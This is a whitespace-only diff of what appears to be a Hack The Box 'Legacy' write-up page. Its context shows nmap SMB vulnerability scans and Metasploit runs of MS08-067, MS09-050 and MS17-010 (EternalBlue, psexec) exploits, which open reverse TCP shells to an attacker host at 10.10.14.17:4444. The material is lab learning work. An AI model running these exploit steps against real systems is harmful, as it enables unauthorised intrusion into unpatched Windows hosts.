@@ -147,14 +147,14 @@ Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:mi
 Host script results:
 |_clock-skew: mean: 5d00h32m17s, deviation: 2h07m16s, median: 4d23h02m17s
 |_nbstat: NetBIOS name: LEGACY, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:50:56:b9:c7:e3 (VMware)
-| smb-os-discovery: 
+| smb-os-discovery:
 |   OS: Windows XP (Windows 2000 LAN Manager)
 |   OS CPE: cpe:/o:microsoft:windows_xp::-
 |   Computer name: legacy
 |   NetBIOS computer name: LEGACY\x00
 |   Workgroup: HTB\x00
 |_  System time: 2020-10-20T12:21:23+03:00
-| smb-security-mode: 
+| smb-security-mode:
 |   account_used: guest
 |   authentication_level: user
 |   challenge_response: supported
@@ -171,7 +171,7 @@ HOP RTT      ADDRESS
 </ul>
 <p>Can we get anything by connecting on the Samba share?</p>
 <div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ smbclient -L //10.10.10.4
-Enter WORKGROUP\kali&#39;s password: 
+Enter WORKGROUP\kali&#39;s password:
 session setup failed: NT_STATUS_INVALID_PARAMETER
 </code></pre></div><p>Apparently not. Nevermind, let&rsquo;s run some Nmap script that targets smb vulnerabilities, you can find the list in <code>/usr/share/nmap/scripts/</code>:</p>
 <div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ ls /usr/share/nmap/scripts/ | grep &#34;smb-vuln&#34;
@@ -194,7 +194,7 @@ PORT    STATE SERVICE
 445/tcp open  microsoft-ds
 
 Host script results:
-| smb-vuln-cve2009-3103: 
+| smb-vuln-cve2009-3103:
 |   VULNERABLE:
 |   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
 |     State: VULNERABLE
@@ -204,12 +204,12 @@ Host script results:
 |           denial of service (system crash) via an &amp; (ampersand) character in a Process ID High header field in a NEGOTIATE
 |           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
 |           aka &#34;SMBv2 Negotiation Vulnerability.&#34;
-|           
+|
 |     Disclosure date: 2009-09-08
 |     References:
 |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
 |_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
-| smb-vuln-ms08-067: 
+| smb-vuln-ms08-067:
 |   VULNERABLE:
 |   Microsoft Windows system vulnerable to remote code execution (MS08-067)
 |     State: LIKELY VULNERABLE
@@ -217,14 +217,14 @@ Host script results:
 |           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
 |           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
 |           code via a crafted RPC request that triggers the overflow during path canonicalization.
-|           
+|
 |     Disclosure date: 2008-10-23
 |     References:
 |       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
 |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
 |_smb-vuln-ms10-054: false
 |_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
-| smb-vuln-ms17-010: 
+| smb-vuln-ms17-010:
 |   VULNERABLE:
 |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
 |     State: VULNERABLE
@@ -232,7 +232,7 @@ Host script results:
 |     Risk factor: HIGH
 |       A critical remote code execution vulnerability exists in Microsoft SMBv1
 |        servers (ms17-010).
-|           
+|
 |     Disclosure date: 2017-03-14
 |     References:
 |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
@@ -282,7 +282,7 @@ msf5 exploit(windows/smb/ms08_067_netapi) &gt; set RHOST 10.10.10.4
 RHOST =&gt; 10.10.10.4
 msf5 exploit(windows/smb/ms08_067_netapi) &gt; run
 
-[*] Started reverse TCP handler on 10.10.14.17:4444 
+[*] Started reverse TCP handler on 10.10.14.17:4444
 [*] 10.10.10.4:445 - Automatically detecting the target...
 [*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
 [*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
@@ -324,7 +324,7 @@ Exploit target:
    0   Windows Vista SP1/SP2 and Server 2008 (x86)
 
 msf5 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) &gt; run
-[*] Started reverse TCP handler on 10.10.14.17:4444 
+[*] Started reverse TCP handler on 10.10.14.17:4444
 [*] 10.10.10.4:445 - Connecting to the target (10.10.10.4:445)...
 [*] 10.10.10.4:445 - Sending the exploit packet (938 bytes)...
 [*] 10.10.10.4:445 - Waiting up to 180 seconds for exploit to trigger...
@@ -347,7 +347,7 @@ RHOSTS =&gt; 10.10.10.4
 msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set LHOST 10.10.14.17
 LHOST =&gt; 10.10.14.17
 msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; run
-[*] Started reverse TCP handler on 10.10.14.17:4444 
+[*] Started reverse TCP handler on 10.10.14.17:4444
 [*] 10.10.10.4:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
 [+] 10.10.10.4:445        - Host is likely VULNERABLE to MS17-010! - Windows 5.1
 [*] 10.10.10.4:445        - Scanned 1 of 1 hosts (100% complete)
@@ -355,7 +355,7 @@ msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; run
 [+] 10.10.10.4:445 - Connection established for exploitation.
 [+] 10.10.10.4:445 - Target OS selected valid for OS indicated by SMB reply
 [*] 10.10.10.4:445 - CORE raw buffer dump (11 bytes)
-[*] 10.10.10.4:445 - 0x00000000  57 69 6e 64 6f 77 73 20 35 2e 31                 Windows 5.1     
+[*] 10.10.10.4:445 - 0x00000000  57 69 6e 64 6f 77 73 20 35 2e 31                 Windows 5.1
 [+] 10.10.10.4:445 - Target arch selected valid for arch indicated by DCE/RPC reply
 [*] 10.10.10.4:445 - Trying exploit with 12 Groom Allocations.
 [*] 10.10.10.4:445 - Sending all but last fragment of exploit packet
@@ -415,7 +415,7 @@ msf5 exploit(windows/smb/ms17_010_psexec) &gt; set RHOSTS 10.10.10.4
 RHOSTS =&gt; 10.10.10.4
 msf5 exploit(windows/smb/ms17_010_psexec) &gt; run
 
-[*] Started reverse TCP handler on 10.10.14.17:4444 
+[*] Started reverse TCP handler on 10.10.14.17:4444
 [*] 10.10.10.4:445 - Target OS: Windows 5.1
 [*] 10.10.10.4:445 - Filling barrel with fish... done
 [*] 10.10.10.4:445 - &lt;---------------- | Entering Danger Zone | ----------------&gt;
